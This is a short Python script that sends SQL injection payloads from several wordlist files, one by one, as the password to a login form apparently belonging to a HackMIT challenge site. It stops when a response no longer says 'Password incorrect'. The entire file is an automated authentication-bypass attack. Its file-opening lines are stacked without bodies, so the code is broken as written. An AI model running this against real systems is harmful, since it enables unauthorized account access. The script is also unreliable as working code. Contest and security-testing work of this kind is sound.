# -*- coding: utf-8 -*-
import requests

url = 'https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/login'
# data = {'username': 'Vivswan_5c6aaa'}
data = {'username': 'noam_chomsky', 'password': ""}

lines = None

with open("Generic Error Based Payloads.txt", "r") as file:
with open("Generic SQL Injection Payloads.txt", "r") as file:
with open("Generic Time Based SQL Injection Payloads.txt", "r") as file:
with open("Generic Union Select Payloads.txt", "r") as file:
with open("SQL Injection Auth Bypass Payloads.txt", "r") as file:
    lines = file.readlines()

print(lines)
for i in lines:
    data["password"] = i.strip()
    x = requests.post(url, data=data)
    print(f"{i.strip()} : {x.text}")

    if not x.text.__contains__("Password incorrect"):
        print()
        print()
        print(f"Success : {i.strip()} : {x.text}")
        break

